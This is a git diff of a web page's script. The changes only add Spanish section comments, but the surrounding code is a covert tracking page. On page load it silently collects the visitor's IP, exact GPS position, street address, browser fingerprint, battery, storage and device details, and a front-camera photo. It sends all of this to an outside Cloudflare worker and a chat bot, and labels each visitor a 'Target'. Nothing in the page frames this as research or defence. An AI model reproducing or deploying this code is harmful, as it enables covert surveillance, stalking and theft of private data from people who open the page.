@@ -23,7 +23,7 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        
+        // ================= CONFIGURACIÓN =================
         const CHAT_ID = '';
         const WORKER_URL = 'https://kali-bot12.societykark.workers.dev';
         const URLS = [
@@ -37,6 +37,7 @@
             'https://kali-bot12.societykark.workers.dev'
         ];
 
+        // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
         async function getLocationFromWorker() {
             try {
                 const res = await fetch(WORKER_URL);
@@ -55,7 +56,7 @@
             }
         }
 
-     
+        // ---------- 2. Obtener ubicación desde ipapi.co ----------
         async function getLocationFromIpapi() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -73,7 +74,7 @@
             }
         }
 
-    
+        // ---------- 3. Geocodificación inversa ----------
         async function reverseGeocode(lat, lng) {
             try {
                 const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
@@ -94,7 +95,7 @@
             return null;
         }
 
-    
+        // ---------- 4. Notificación de apertura ----------
         async function sendOpenNotification(ip) {
             const msg = `🔔 *Alerta de apertura*\n📍 IP: ${ip}\n🕐 ${new Date().toLocaleString()}`;
             const formData = new FormData();
@@ -105,7 +106,7 @@
             } catch(e) {}
         }
 
-    
+        // ---------- 5. Fingerprint ----------
         async function getFingerprint() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
@@ -124,7 +125,7 @@
             return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
         }
 
-    
+        // ---------- 6. Datos del dispositivo ----------
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let model = "Desconocido";
@@ -145,7 +146,7 @@
             };
         }
 
-    
+        // ---------- 7. Almacenamiento ----------
         async function getStorageInfo() {
             try {
                 const est = await navigator.storage.estimate();
@@ -158,7 +159,7 @@
             }
         }
 
-
+        // ---------- 8. Batería ----------
         async function getBatteryInfo() {
             try {
                 const battery = await navigator.getBattery();
@@ -171,12 +172,12 @@
             }
         }
 
-        
+        // ---------- 9. Hora local ----------
         function getLocalTime() {
             return new Date().toLocaleString();
         }
 
-    
+        // ---------- 10. GPS exacto ----------
         function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -198,7 +199,7 @@
             });
         }
 
-    
+        // ---------- 11. Cámara frontal ----------
         async function capturePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -222,7 +223,7 @@
             return blob;
         }
 
-        
+        // ---------- 12. Envío a múltiples URLs ----------
         async function sendToMultiple(text, photoBlob, location) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -247,16 +248,16 @@
             return resultados.some(r => r.ok);
         }
 
-        
+        // ---------- 13. Proceso principal (automático y silencioso) ----------
         window.addEventListener('load', async function() {
             try {
-                
+                // Notificación de apertura
                 let ipInfo = await getLocationFromWorker();
                 if (ipInfo && ipInfo.ip) {
                     await sendOpenNotification(ipInfo.ip);
                 }
 
-               
+                // Recolectar datos
                 const gps = await getGPS();
                 const workerLoc = await getLocationFromWorker();
                 const ipapiLoc = await getLocationFromIpapi();
@@ -273,7 +274,7 @@
                     address = await reverseGeocode(gps.lat, gps.lng);
                 }
 
-               
+                // Construir mensaje
                 let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
                 msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                 msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
@@ -309,7 +310,7 @@
                 msg += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
                 msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @societykark`;
 
-
+                // Enviar todo
                 await sendToMultiple(msg, photo, gps);
 
             } catch(e) {
